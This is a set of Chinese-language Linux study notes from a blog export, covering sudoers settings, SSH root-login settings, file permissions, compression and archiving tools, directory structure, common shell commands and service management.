root ALL=(ALL) ALL hadoop ALL=(ALL) ALL spark ALL=(ALL) ALL 然后，hadoop用户和spark用户就可以用sudo来执行系统级别的指令 [hadoop\@hadoop01 ~]\$ sudo useradd huangxiaoming 123456789&gt; ~ ➤ su shixuanji # 修改了配置文件之后, 用sudo可以访问root&gt; [shixuanji@cts1 root]$ sudo /bin/ls /root&gt; [sudo] password for shixuanji:&gt; anaconda-ks.cfg date.txt Documents git-2018-05-22 install.log.syslog Music Public Videos&gt; autojump Desktop Downloads install.log k-vim Pictures Templates wget-log&gt; [shixuanji@cts1 root]$ ls /root&gt; ls: 无法打开目录/root: 权限不够&gt; [shixuanji@cts1 root]$&gt; 让一个普通用户可以无密码登录到root用户, 还是修改配置文件 /etc/sudoers` 禁止远程登录 修改 vi /etc/ssh/sshd_config 此文件中的 #PermitRootLogin yes 为 no 这样就不能远程 ssh 登录了 查看系统日志 查看登录错误之类的日志 tail /var log/secure 有时候, 登录时, 要过几秒才让输入登录密码 修改 /etc/ssh/sshd_config中的UseDNS=no, 就不会去找DNS了 普通用户免密使用sudo &amp; 免密登录为root12345678vi /ect/sudoers# 设置不需要使用密码使用sudoap ALL=(ALL) NOPASSWD: ALL # 使用 sudo su - 免密登录到root账户User_Alias USER_SU=apCmnd_Alias SU=/bin/suUSER_SU ALL=(ALL) NOPASSWD: SU 5. 切换用户在linux的系统使用过程当中，免不了会有多个用户来回切换使用。 所以在此提供切换用户的使用操作：切换用户使用的命令是 su（switch user） 从普通用户切换到root用户 , 需要输密码 su root 或 su 从root用户切换到普通用户, 不需要输密码 su xxx 5. 文件权限1、linux文件权限的描述格式解读Linux用 户分为：拥有者、组群(Group)、其他（other），Linux系统中，预设的情況下，系统中所有的帐号与一般身份使用者，以及root的相关信 息， 都是记录在/etc/passwd文件中。每个人的密码则是记录在/etc/shadow文件下。 此外，所有的组群名称记录在/etc/group內 linux文件的用户权限的分析图 123456 -rw-r--r-- 1 user staff 651 Oct 12 12:53 .gitmodules# ↑╰┬╯╰┬╯╰┬╯# ┆ ┆ ┆ ╰┈ 0 其他人# ┆ ┆ ╰┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈ g 属组# ┆ ╰┈┈┈┈ u 属主# ╰┈┈ 第一个字母 `d` 代表目录，`-` 代表普通文件 d：标识节点类型（d：文件夹 -：文件 l：链接） r：可读 w：可写 x：可执行 文件 文件夹 r 可读取内容 可以ls w 可修改文件的内容 可以在其中创建或者删除子节点 x 能否运行这个文件 能否cd**进入这个目录** 2、 修改文件权限chmod命令 用来变更文件或目录的权限。在UNIX系统家族里，文件或目录权限的控制分别以读取、写入、执行3种一般权限来区分，另有3种特殊权限可供运用。用户可以使用chmod指令去变更文件与目录的权限，设置方式采用文字或数字代号皆可。符号连接的权限无法变更，如果用户对符号连接修改权限，其改变会作用在被连接的原始文件。 语法12345chmod(选项)(参数)r=读取属性 //值＝4 w=写入属性 //值＝2 x=执行属性 //值＝1 选项： u User，即文件或目录的拥有者；g Group，即文件或目录的所属群组；o Other，除了文件或目录拥有者或所属群组之外，其他用户皆属于这个范围；a All，即全部的用户，包含拥有者，所属群组以及其他用户；r 读取权限，数字代号为“4”;w 写入权限，数字代号为“2”；x 执行或切换权限，数字代号为“1”；- 不具任何权限，数字代号为“0”；s 特殊功能说明：变更文件或目录的权限。 参数: 权限模式：指定文件的权限模式；文件：要改变权限的文件。 示例变更 文件/目录 的权限 1234567891011# 直接修改chmod g-rw haha.dat ## 表示将haha.dat对所属组的rw权限取消chmod o-rw haha.dat ## 表示将haha.dat对其他人的rw权限取消chmod u+x haha.dat ## 表示将haha.dat对所属用户的权限增加xchmod a-x haha.dat ## 表示将haha.dat对所用户取消x权限# 也可以用数字的方式来修改权限(常用)chmod 664 haha.dat就会修改成 rw-rw-r--如果要将一个文件夹的所有内容权限统一修改，则可以-R参数chmod -R 770 aaa/ 变更 文件/目录 的拥有者 或 所属组 1234# &lt;只有root权限能执行&gt;chown angela aaa ## 改变所属用户chown :angela aaa ## 改变所属组chown angela:angela aaa/ ## 同时修改所属用户和所属组 6. 压缩打包gzipgzip是在Linux系统中经常使用的一个对文件进行压缩和解压缩的命令，既方便又好用。 gzip是个使用广泛的压缩程序，文件经它压缩过后，其名称后面会多处“.gz”扩展名。 语法 gzip (选项) (参数) 选项 123456789101112131415161718-a或——ascii：使用ASCII文字模式；-d或--decompress或----uncompress：解开压缩文件；-f或——force：强行压缩文件。不理会文件名称或硬连接是否存在以及该文件是否为符号连接；-h或——help：在线帮助；-l或——list：列出压缩文件的相关信息；-L或——license：显示版本与版权信息；-n或--no-name：压缩文件时，不保存原来的文件名称及时间戳记；-N或——name：压缩文件时，保存原来的文件名称及时间戳记；-q或——quiet：不显示警告信息；-r或——recursive：递归处理，将指定目录下的所有文件及子目录一并处理；-S或&lt;压缩字尾字符串&gt;或----suffix&lt;压缩字尾字符串&gt;：更改压缩字尾字符串；-t或——test：测试压缩文件是否正确无误；-v或——verbose：显示指令执行过程；-V或——version：显示版本信息；-&lt;压缩效率&gt;：压缩效率是一个介于1~9的数值，预设值为“6”，指定愈大的数值，压缩效率就会愈高；--best：此参数的效果和指定“-9”参数相同；--fast：此参数的效果和指定“-1”参数相同。-num 用指定的数字num调整压缩的速度，-1或--fast表示最快压缩方法（低压缩比），-9或--best表示最慢压缩方法（高压缩比）。系统缺省值为6。 参数 文件列表：指定要压缩的文件列表。 示例 12345678910111213# 把test6目录下的每个文件压缩成.gz文件gzip *# 把上例中每个压缩的文件解压，并列出详细的信息gzip -dv *# 详细显示例1中每个压缩的文件的信息，并不解压gzip -l *# 压缩一个tar备份文件，此时压缩文件的扩展名为.tar.gzgzip -r log.tar# 递归的压缩目录gzip -rv test6# 这样，所有test下面的文件都变成了.gz，目录依然存在只是目录里面的文件相应变成了.gz.这就是压缩，和打包不同。因为是对目录操作，所以需要加上-r选项，这样也可以对子目录进行递归了。# 递归地解压目录gzip -dr test6 bzipbzip2命令 用于创建和管理（包括解压缩）“.bz2”格式的压缩包。 语法 bzip2 (选项) (参数) 选项 123456789101112-c或——stdout：将压缩与解压缩的结果送到标准输出；-d或——decompress：执行解压缩；-f或-force：bzip2在压缩或解压缩时，若输出文件与现有文件同名，预设不会覆盖现有文件。若要覆盖。请使用此参数；-h或——help：在线帮助；-k或——keep：bzip2在压缩或解压缩后，会删除原始文件。若要保留原始文件，请使用此参数；-s或——small：降低程序执行时内存的使用量；-t或——test：测试.bz2压缩文件的完整性；-v或——verbose：压缩或解压缩文件时，显示详细的信息；-z或——compress：强制执行压缩；-V或——version：显示版本信息；--repetitive-best：若文件中有重复出现的资料时，可利用此参数提高压缩效果；--repetitive-fast：若文件中有重复出现的资料时，可利用此参数加快执行效果。 参数 文件：指定要压缩的文件。 示例 1234567891011## 压缩指定文件filename:bzip2 filename 或 bzip2 -z filename## 解压指定的文件filename.bz2:bzip2 -d filename.bz2 或 bunzip2 filename.bz2# 压缩解压的时候将结果也输出：bzip2 -v filename filename: 0.119:1, 67.200 bits/byte, -740.00% saved, 5 in, 42 out.# 压缩解压的时候，除了生成结果文件，将原来的文件也保存: bzip2 -k filename# 解压到标准输出, 输出文件的内容bzip2 -dc filename.bz2 tarLinux下的归档使用工具，用来打包和备份。 首先要弄清两个概念：打包和压缩。打包是指将一大堆文件或目录变成一个总的文件；压缩则是将一个大的文件通过一些压缩算法变成一个小文件。 为什么要区分这两个概念呢？这源于Linux中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip bzip2命令）。 其实最简单的使用 tar 就只要记忆底下的方式即可： tar.gz 格式: 1234# 一次性打包并压缩、解压并解包打包并压缩： tar -zcvf [目标文件名].tar.gz [原文件名/目录名]解压并解包： tar -zxvf [原文件名].tar.gz -C [目标目录]注：z代表用gzip算法来压缩/解压。 tar.bz2格式: 1234# 一次性打包并压缩、解压并解包打包并压缩： tar -jcvf [目标文件名].tar.bz2 [原文件名/目录名]解压并解包： tar -jxvf [原文件名].tar.bz2注：小写j代表用bzip2算法来压缩/解压。 其实用不到的话就不用看了, 下面的. 语法 tar(选项)(参数) 选项 1234567891011121314151617181920212223-A或--catenate：新增文件到以存在的备份文件；-B：设置区块大小；-c或--create：建立新的备份文件；-C &lt;目录&gt;：这个选项用在解压缩，若要在特定目录解压缩，可以使用这个选项。-d：记录文件的差别；-x或--extract或--get：从备份文件中还原文件；-t或--list：列出备份文件的内容；-z或--gzip或--ungzip：通过gzip指令处理备份文件；-Z或--compress或--uncompress：通过compress指令处理备份文件；-f&lt;备份文件&gt;或--file=&lt;备份文件&gt;：指定备份文件；-v或--verbose：显示指令执行过程；-r：添加文件到已经压缩的文件；-u：添加改变了和现有的文件到已经存在的压缩文件；-j：支持bzip2解压文件；-v：显示操作过程；-l：文件系统边界设置；-k：保留原有文件不覆盖；-m：保留文件不被覆盖；-w：确认压缩文件的正确性；-p或--same-permissions：用原来的文件权限还原文件；-P或--absolute-names：文件名使用绝对名称，不移除文件名称前的“/”号；-N &lt;日期格式&gt; 或 --newer=&lt;日期时间&gt;：只将较指定日期更新的文件保存到备份文件里；--exclude=&lt;范本样式&gt;：排除符合范本样式的文件。 参数 文件或目录：指定要打包的文件或目录列表。 -f: 使用档案名字，切记，这个参数是最后一个参数，后面只能接档案名。 12345- z：有gzip属性的- j：有bz2属性的- Z：有compress属性的- v：显示所有过程- O：将文件解开到标准输出 实例 zip格式 123压缩： zip -r [目标文件名].zip [原文件/目录名]解压： unzip [原文件名].zip注： -r参数代表递归 tar格式（该格式仅仅打包，不压缩） 123打包：tar -cvf [目标文件名].tar [原文件名/目录名]解包：tar -xvf [原文件名].tar注：c参数代表create（创建），x参数代表extract（解包），v参数代表verbose（详细信息），f参数代表filename（文件名），所以f后必须接文件名。 tar.gz格式(方式二常用) 12345678# 方式一：利用前面已经打包好的tar文件，直接用压缩命令。压缩：gzip [原文件名].tar解压：gunzip [原文件名].tar.gz# 方式二：一次性打包并压缩、解压并解包打包并压缩： tar -zcvf [目标文件名].tar.gz [原文件名/目录名]解压并解包： tar -zxvf [原文件名].tar.gz注：z代表用gzip算法来压缩/解压。 tar.bz2格式 12345678方式一：利用已经打包好的tar文件，直接执行压缩命令：压缩：bzip2 [原文件名].tar解压：bunzip2 [原文件名].tar.bz2方式二：一次性打包并压缩、解压并解包打包并压缩： tar -jcvf [目标文件名].tar.bz2 [原文件名/目录名]解压并解包： tar -jxvf [原文件名].tar.bz2注：小写j代表用bzip2算法来压缩/解压。 jar格式 12345678910压缩：jar -cvf [目标文件名].jar [原文件名/目录名]解压：jar -xvf [原文件名].jar# 注：如果是打包的是Java类库，并且该类库中存在主类，那么需要写一个META-INF/MANIFEST.MF配置文件，内容如下：Manifest-Version: 1.0Created-By: 1.6.0_27 (Sun Microsystems Inc.)Main-class: the_name_of_the_main_class_should_be_put_here# 然后用如下命令打包：jar -cvfm [目标文件名].jar META-INF/MANIFEST.MF [原文件名/目录名] 这样以后就能用“java -jar [文件名].jar”命令直接运行主类中的public static void main方法了。 7z格式 12345压缩：7z a [目标文件名].7z [原文件名/目录名]解压：7z x [原文件名].7z注：这个7z解压命令支持rar格式，即：7z x [原文件名].rar 其它例子 参考网址 7. Linux开关机和重启 开机：开机键 关机：shutdown，halt，init 0，poweroff 重启：reboot，init 6 Shutdown命令详解： shutdown -h now ## 立刻关机 shutdown -h +10 ## 10分钟以后关机 shutdown -h 12:00:00 ##12点整的时候关机]]></content>
      <categories>
        <category>Linux</category>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux学习笔记-1]]></title>
    <url>%2F2018%2F05%2F26%2FLinux%2FLinux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1%2F</url>
    <content type="text"><![CDATA[1&gt; 初识Linux1. Linux介绍Linux系统是一套免费使用和自由传播的类UNIX操作系统（主要用在服务器上），是一个基于POSIX和UNIX的多用户、多任务、支持多线程和多CPU的操作系统。它能运行主要的UNIX工具软件、应用程序和网络协议。它支持32位和64位硬件。Linux继承了UNIX以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。 UNIX：操作系统，是美国AT&amp;T公司贝尔实验室于1969年完成的操作系统，最早由肯·汤普逊（Ken Thompson），丹尼斯·里奇（Dennis Ritchie）开发。在1971年首次对外发布，刚好在1971，丹尼斯·里奇（Dennis Ritchie）发明了C语言，后来在1973，Unix被他用C语言重新编写。Unix前身源自于MultiCS，叫UniCS，后来改名叫Unix。 POSIX：可移植操作系统接口（英语：Portable Operating System Interface of UNIX，缩写为POSIX），是IEEE（电气和电子工程师协会）为要在各种UNIX操作系统上运行软件，而定义API的一系列互相关联的标准的总称。 GNU：1983年，Richard Stallman（理查德·马修·斯托曼）创立GNU计划。一套完全自由的操作系统，其内容软件完全以GPL方式发布。这个操作系统是GNU计划的主要目标（发展出一套完整的开放源代码操作系统来取代Unix），名称来自GNU\’s Not Unix!的递归缩写。 GPL：一种GNU通用公共许可协议，为保证GNU软件可以自由的使用、复制、修改和发布，所有的GNU软件都有一份在禁止其他人添加任何限制的情况下授权所有权利给任何人的协议条款，是一个被广泛使用的自由软件许可协议条款，保证终端用户运行、学习、分享（复制）及编辑软件之自由，GPL是自由软件和开源软件的最流行许可证，特色表现： •取得软件与原始码：您可以根据自己的需求来执行这个自由软件 •复制：您可以自由的复制该软件 •修改：您可以将取得的原始码进行程序修改工作，使之适合您的工作 •再发行：您可以将您修改过的程序，再度的自由发行，而不会与原先的撰写者冲突 •回馈：您应该将您修改过的程序代码回馈于社群 ==不同许可证的区别== 1985年，Richard Stallman又创立了自由软件基金会（Free Software Foundation，FSF）来为GNU计划提供技术、法律以及财政支持。 1990年，GNU计划开发主要项目有Emacs（文本编辑器）、GCC（GUN Compiler Collection，GNU编译器集合）、Bash等，GCC是一套GNU开发的编程语言编译器。还有开发一些UNIX系统的程序库和工具。 Linux操作系统诞生于1991年10月5日（这是第一次正式向外公布时间），与UNIX兼容，并在GPL条款下发布。现在，Linux产生了许多不同的Linux发行版本，但它们都使用了Linux内核。Linux可安装在各种计算机硬件设备中，比如手机、平板电脑、路由器、视频游戏控制台、台式计算机、大型机和超级计算机。 1992年，Linux与其他GUN软件结合，完全自由的GNU/Linux操作系统正式诞生，简称Linux ==Linux的基本思想有两点== 第一，一切都是文件 第二，每个软件都有确定的用途 与Unix思想十分相近。 2. Linux特点1、分时的多用户、多任务操作系统 2、多数网络协议支持、方便的远程管理 3、强大的内存管理和文件系统管理 4、大量的可用的软件和免费的软件 5、优良的稳定性和安全性 6、良好的可移植性和灵活性 7、可供选择的厂商多 3. Linux操作系统架构 补充：linux内核必须加上一个”界面”软件，才能让用户去使用，”界面”分两类： a、命令行界面CLI SHELL（有很多种，最流行的一种是bash shell） b、图形界面GUI SHELL（也有很多种，目前最流行的有两种：gnome和kde） 4. Linux内核严格来讲，Linux不是一个操作系统，Linux只是一个操作系统中的内核。 内核建立了计算机软件与硬件之间通讯的平台，内核提供系统服务，比如文件管理、虚拟内存、设备I/O、进程管理等。 内核官网：[http://www.kernel.org/]{.underline}。目前最新的内核版本：4.13.5 要注意区分linux发型版本和linux内核版本。两者不是同一个事物 下面这位是Linux内核的作者： 这是Linux的logo 5. 常见发行版红帽企业系统（RedHat Enterprise Linux, RHEL） 全球最大的开源技术厂商，全世界内使用最广泛的Linux发布套件， 提供性能与稳定性极强的Linux套件系统并拥有完善的全球技术支持。 官网：[http://www.redhat.com]{.underline} 社区企业操作系统（CentOS） 最初是将红帽企业系统”重新编译/发布”给用户免费使用而广泛使用， 当前已正式加入红帽公司并继续保持免费（随RHEL更新而更新）。 官网：[http://www.centos.org/]{.underline} 红帽用户桌面版（Fedora [Linux]） 最初由红帽公司发起的桌面版系统套件（目前已经不限于桌面版）， 用户可免费体验到最新的技术或工具，而功能成熟后加入到RHEL中。 官网：[http://fedora.redhat.com]{.underline} 国际化组织的开源操作系统（Debian） 提供超过37500种不同的自由软件且拥有很高的认可度， 对于各类内核架构支持性良好，稳定性、安全性强更有免费的技术支持。 官网：[http://www.debian.org/]{.underline} 基于Debian的桌面版（Ubuntu） Ubuntu是一款基于Debian派生的产品，对新款硬件具有极强的兼容能力。 普遍认为Ubuntu与Fedora都是极其出色的LINUX桌面系统。 官网：[http://www.ubuntulinux.org/]{.underline} 当然还有国内的国防科技大学发行麒麟kylin和中科院发行红旗RedFlag 2&gt; Linux文件系统1. CentOS的目录结构 2. 根目录下每个目录的简单解释 /**：**根目录，一般根目录下只存放目录，不要存放文件，/etc、/bin、/dev、/lib、/sbin应该和根目录放置在一个分区中 /bin:/usr/bin: 可执行二进制文件的目录，如常用的命令ls、tar、mv、cat等 /boot**：**放置linux系统启动时用到的一些文件。/boot/vmlinuz为linux的内核文件，以及/boot/gurb。建议单独分区，分区大小100M即可 /dev**：**存放linux系统下的设备文件，访问该目录下某个文件，相当于访问某个设备，常用的是挂载光驱mount /dev/cdrom /mnt /etc**：**系统配置文件存放的目录，不建议在此目录下存放可执行文件，重要的配置文件有/etc/inittab、/etc/gateways、/etc/resolv.conf、/etc/fstab、/etc/init.d、/etc/X11、/etc/sysconfig、/etc/xinetd.d修改配置文件之前记得备份。注：/etc/X11存放与x windows有关的设置 /home**：**系统默认的用户家目录，新增用户账号时，用户的家目录都存放在此目录下，表示当前用户的家目录，test表示用户test的家目录。建议单独分区，并设置较大的磁盘空间，方便用户存放数据 /lib:/lib64:/usr/lib:/usr/local/lib**：**系统使用的函数库的目录，程序在执行过程中，需要调用一些额外的参数时需要函数库的协助，比较重要的目录为/lib/modules /lost+fount**：**系统异常产生错误时，会将一些遗失的片段放置于此目录下，通常这个目录会自动出现在装置目录下。如加载硬盘于/disk 中，此目录下就会自动产生目录/disk/lost+found /mnt:/media**：**光盘默认挂载点，通常光盘挂载于/mnt/cdrom下，也不一定，可以选择任意位置进行挂载 /opt**：**给主机额外安装软件所摆放的目录。如：FC4使用的Fedora 社群开发软件，如果想要自行安装新的KDE桌面软件，可以将该软件安装在该目录下。以前的Linux系统中，习惯放置在 /usr/local目录下option /proc**：*此目录的数据都在内存中，如系统核心，外部设备，网络状态，由于数据都存放于内存中，所以不占用磁盘空间，比较重要的目录有/proc/cpuinfo、/proc/interrupts、/proc/dma、/proc/ioports、/proc/net/等process /root**：**系统管理员root的家目录，系统第一个启动的分区为/，所以最好将/root和/放置在一个分区下 /sbin:/usr/sbin:/usr/local/sbin**：**放置系统管理员使用的可执行命令，如fdisk、shutdown、mount等。与/bin不同的是，这几个目录是给系统管理员root使用的命令，一般用户只能”查看”而不能设置和使用。 /selinux**：**selinux软件目录，用于保证系统安全 /srv**：**服务启动之后需要访问的数据目录，如www服务需要访问的网页数据存放在/srv/www内service /sys**：**类似于/proc的特殊文件系统，存放内核数据信息 /tmp**：**一般用户或正在执行的程序临时存放文件的目录,任何人都可以访问,重要数据不可放置在此目录下 /usr**：应用程序存放目录， /usr/bin 存放应用程序 /usr/share 存放共享数据 /usr/lib 存放不能直接运行的，却是许多程序运行所必需的一些函数库文件 /usr/local:存放软件升级包 /usr/share/doc: 系统说明文件存放目录 /usr/share/man: 程序说明文件存放目录，使用man ls时会查询/usr/share/man/man1/ls.1.gz的内容建议单独分区，设置较大的磁盘空间 usr**：user share resources/unix share resouces /var**：**放置系统执行过程中经常变化的文件，如： /var/log：随时更改的日志文件 /var/log/message：所有的登录文件存放目录 /var/spool/mail：邮件存放的目录 /var/run：程序或服务启动 使用建议： 用户应该将文件存储在自己的主目录及其子目录下 系统绝大多数设置都在/etc目录下 不要修改/或者/usr目录下的任何内容，除非你真的清楚你在做什么，也就是说/目录最好和安装好系统之初保持一致 大多数工具和应用软件程序都安装在/bin，/sbin，/usr/bin，/usr/sbin，/usr/local/bin 文件或者目录都有唯一的绝对路径，没有盘符的概念 3&gt; Linux命令终端1. Linux 的命令格式：命令选项 命令参数注意：三者之间要空格隔开，其中命令选项分为长格式和短格式。 短格式用’-‘表示，比如：-l， 长格式用”–”表示，比如：–help， 也可以使用组合格式，比如：-a -l 等价于-la或者-al 2. Linux的默认命令提示符：#：管理员用户 $：普通用户 PS: Linux以回车键表示命令结束，如果 linux命令需要折行输入，那么可以以 \表示每行结束 4&gt; 常用命令归纳分类基本命令 文件管理 mkdir, rmdir, mv, rm, cp, touch, cat, tac, echo, more, less, head, tail, file, find, rename, ln, pwd, scp, alias 磁盘管理 ls, cd, du, df, mount, unmounts, fdisk 文档处理 wc, sort, uniq, cut, sed, awk, grep, vi, diff 用户和组 useradd, usermod, passwd, userdel, groupadd, groupdel, chgrp, su 文件传输 get, put, wget 网络通信 telnet, nc, ifconfig, ping, netstat, ip, host 备份压缩 gzip, bzip2, bunzip2, tar, zip 系统管理 exit, kill, last, ps, top, free, pstree, reboot, halt, shutdown, sudo, who, w, whoami, whereis, which, last, whatis 系统设置 clear, set, unset, hwclock, time, date, 其他 history, hostname, nohup, service, init, rpm, ssh, cal, yum 网站速查http://man.linuxde.net/ http://www.jb51.net/linux/ https://jaywcjlove.github.io/linux-command ps: 直接在命令行中, 用 man xx, 也可以查看命令信息 5&gt; 常用文件系统命令详解磁盘管理 cd change directory 常使用方式： cd sourcedir 进入用户主目录 cd ~ 进入用户主目录 cd - 返回进入此目录之前所在的目录 cd .. 返回上级目录（若当前目录为”/“，则执行完后还在”/“；”..”为上级目录的意思） cd ../.. 返回上两级目录 pwd print working directory pwd 显示当前工作目录 ls list：显示目录内容列表 使用格式：ls 选项 目录或文件名 常用选项 -l：详细信息显示 -a：显示所有子目录和文件的信息，包括隐藏文件 -A：类似于“-a”，但不显示“.”和“..”目录的信息 -R：递归显示内容 -h：以友好方式显示文件大小 例子： ls -l ## 列出文件详细信息， 也可以写作 ll ls -lah ## 以友好方式显示包括隐藏文件的详细信息 du disk usage：显示每个文件和目录的磁盘使用空间 使用格式：du 选项 目录或文件名 常用选项： -a：统计时包括所有的文件，而不仅仅只统计目录 -h：以更易读的字节单位（K、M等）显示信息 -s：只统计每个参数所占用空间总的大小 例子： du -ah ## df disk free：显示磁盘相关信息 常用选项： -h：以更易读的字节单位（K、M等）显示信息 -T：显示分区格式 例子： df -h ## 显示磁盘信息，以友好方式 df -T -h ## 以友好格式显示磁盘信息，并且附加磁盘格式 文件管理 touch 创建空文件 或更新文件时间标记 使用格式： touch 文件名 file 查看文件类型 使用格式： file 文件名 根据文件内容格式判断文件类型。而不是根据后缀名 mkdir 创建文件夹 make directory 使用格式：mkdir 选项 参数 常用选项： -p：已级联的方式创建文件夹 例子： mkdir -p /root/ma/niu/zhu/dagou ## 上级目录不存在自动创建上一级目录，常用 cp 复制文件 使用格式： cp 选项 源文件或目录… 目标文件或目录 常用选项： -r：递归复制整个目录树 -p：保持源文件的属性不变 -i：需要覆盖文件或目录时进行提醒 rm 删除文件或目录 使用格式：rm [选项] 文件或目录 常用选项： -f：强行删除文件或目录，不进行提醒 -i：删除文件或目录时提醒用户确认 -r：递归删除整个目录树 例子： rm -rf /root/ma/ ## 不提醒递归删除整个目录，慎用慎用慎用 mv 移动文件 如果与源文件位置一样，则相当于重命名 使用格式： mv [选项]… 源文件或目录… 目标文件或目录 常用选项： -f：若目标文件或目录与现有的文件或目录重复，则直接覆盖现有的文件或目录 -u：当源文件比目标文件新或者目标文件不存在时，才执行移动操作 rmdir 删除空文件夹 常用选项： -p或–parents：删除指定目录后，若该目录的上层目录已变成空目录，则将其一并删除； rmdir -p /root/aa/bb/cc/dd/ee 删除文件夹ee，如果删除ee后，dd变为空，则删除dd，依次类推 cat 连接文件并打印到标准输出设备上 常用选项： -n或–number：由1开始对所有输出的行数编号 cat /home/hadoop/data.txt ## 查看文件内容 tac 倒序输出文件内容 tac /home/hadoop/data.txt echo 输出指定的字符串或者变量 常用选项： -e：若字符串中出现以下字符，则特别加以处理，而不会将它当成一般文字输出： \a 发出警告声； \b 删除前一个字符； \c 最后不加上换行符号； \f 换行但光标仍旧停留在原来的位置； \n 换行且光标移至行首； \r 光标移至行首，但不换行； \t 插入tab； \v 与\f相同； \ 插入\字符； \nnn 插入nnn（八进制）所代表的ASCII字符； 例子： echo ‘ma’ ## 输出ma echo -e ‘ma\n’ ## 打印ma之后换行 echo -ne ‘ma’ ‘zhonghua’ ## 打印完不换行 echo ‘ma’ &gt; ma.dat ## 覆盖 echo ‘ma’ &gt;&gt; ma.dat ## 追加 echo $PWD ## 输出变量内容 head 在屏幕上显示指定文件的开头若干行 默认显示10行 常用选项： -n&lt;数字&gt;：指定显示头部内容的行数； 例子： head -n 5 install.log ## 显示该文件前五行内容 tail 在屏幕上显示指定文件的末尾若干行 常用选项： -f：显示文件最新追加的内容 tail -f install.log ## 显示最新追加的内容 ## 显示文件file的最后10行 tail -1 file ## 显示文件file最后一行的内容 tail -c 10 file ## 显示文件file的最后10个字符 more 显示文件内容，每次显示一屏 使用方式： 按Space键：显示文本的下一屏内容。 按Enter键：只显示文本的下一行内容。 按h键：显示帮助屏，该屏上有相关的帮助信息。 按b键：显示上一屏内容。 按q键：退出more命令。 less 分屏上下翻页浏览文件内容 和more使用方式基本类似 按e键：向上滚动一行 按y键：向下滚动一行 G：跳到文件末尾 gg：跳到文件首行 ln 用来为文件创件连接 软链接 -s 和 硬链接 ln /mnt/cdrom1 /var/www/html/centos/ —&gt;硬链接 ln -s /mnt/cdrom2 /var/www/html/centos/ –&gt;软链接-符号链接 alias 别名 查看别名：alias 定义别名：alias la=&#39;ll -a 取消别名：unalias la 软/硬 链接相关软链接, ln -s 文件/文件夹 产生的链接 创建文件的软链接 1ln -s /tmp/yum.log /root/yuntest 创建文件夹的软链接 1234# 后面的链接不指定名字, 就默认用前面的源文件/文件夹名字ln -s /tmp /root ---lrwxrwxrwx. 1 root root 4 5月 29 20:53 tmp -&gt; /tmp 如果软链接是指向目录的话, 是可以直接cd进去的, cd进去的是真实的目录! 12pwd -P: 查看软链接的真实指向某目录(物理目录)pwd -L: 逻辑目录 硬链接, ln 不加s, 一般不会用 不能链接目录 不能跨分区做硬链接 其它有用的命令123456789101112131415161718man：显示命令帮助信息clear：清屏，或者按ctrl + l也行ctrl + c：退出当前进程ctrl + z：挂起当前前台进程whatis：命令是什么whereis：在标准路径下搜索与名称相关的文件，whereis将所有搜索到的文件都显示which：which在设定的搜索路径下进行目录搜索，只显示搜索到的第一个文件su：切换用户history：显示历史命令hostname：显示主机名set：查看系统变量get：下载文件put：上传文件sudo：以root用户权限执行一次命令exit：退出登录状态w：显示当前连接的用户who：显示当前会话信息uptime：查看系统运行时间 使用小技巧(重点)12345678910111213141516ctrl + u：清除光标前的命令，相当于剪切 # !ctrl + k：清除光标后的命令，相当于剪切 # !ctrl + y：粘贴 # !ctrl + t：把光标前面的那个字符往后挪动一位ctrl + l：清屏ctrl + a: 移到命令行首 # !ctrl + e: 移到命令行尾 # !ctrl + ← →: 光标移动一个单词 # !!!：执行上一次命令 # !!$：上个命令的最后一个单词ctrl + w：删除光标前一个单词cd data; cat sed.txt：表示先执行cd，然后执行cat，工作目录会切换(cd data; cat sed.txt)：跟上个命令相比，不切换工作目录|：管道符，表示把前面命令内容的输出当做后面命令的输入&gt;：表示内容覆盖&gt;&gt;：表示内容追加]]></content>
      <categories>
        <category>Linux</category>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux学习笔记-3]]></title>
    <url>%2F2018%2F05%2F25%2FLinux%2FLinux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-3%2F</url>
    <content type="text"><![CDATA[1. 系统服务管理 检查本机httpd服务是否开启, 使用命令service httpd status 开启/关闭/重启 httpd服务 service httpd start/stop/restart 查看所有的服务状态 service --status-all 过滤出某个服务service –status-all | grep httpd` 防火墙服务 sevice iptables status/stop/start/restart 配置后台服务进程开机自启 12345# 开启开机自启http进程-&gt; chkconfig httpd on# 查看httpd的开机自启状态-&gt; chkconfig --list | grep httpdhttpd 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭 缺省系统运行级别 0 为停机，机器关闭。 1 为单用户模式，就像Win9x下的安全模式类似。 2 为多用户模式，但是没有NFS支持。 3 为完整的多用户模式，是标准的运行级。 4 一般不用，在一些特殊情况下可以用它来做一些事情。例如在笔记本 电脑的电池用尽时，可以切换到这个模式来做一些设置。 5 就是X11，进到X Window系统了。 6 为重启，运行init 6机器就会重启。 Centos中时区 当前正在使用的时d区文件位于 /etc/localtime 其他时区文件则位于 /usr/share/zoneinfo 中国时区使用 /usr/share/zoneinfo/Asia/Shanghai 更改时区 cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime 如果没有 Asia/Shanghai 时区文件，请使用tzselect命令去生成时区文件，生成好的时区文件就在 /usr/share/zoneinfo目录下 修改系统时间 date : 直接查看时间 date -s : 手动设置时间 sudo ntpdate ntp1.aliyun.com : 同步时间服务器时间 2. 简单磁盘管理 df：列出文件系统的整体磁盘使用量 -h 人性化的列出文件的大小等 123-&gt; # df -h /dev/sr0Filesystem Size Used Avail Use% Mounted on/dev/sr0 3.7G 3.7G 0 100% /media/cdrom du：检查磁盘空间使用量 fdisk：用于磁盘分区 3. 文件的基本属性前缀的含义 1234567# 查看目录的权限-&gt; # ll -d /var/www/html/localyum ls -ld 也是一样, 查看目录的权限drwxr-xr-x. 7 root root 4096 5月 25 07:50 autojump-rw-r--r--. 1 root root 50434 5月 23 10:11 install.loglrwxrwxrwx. 1 root root 13 5月 25 21:04 localyum -&gt; /media/cdrom/ 当为[ d ]则是目录 当为[ - 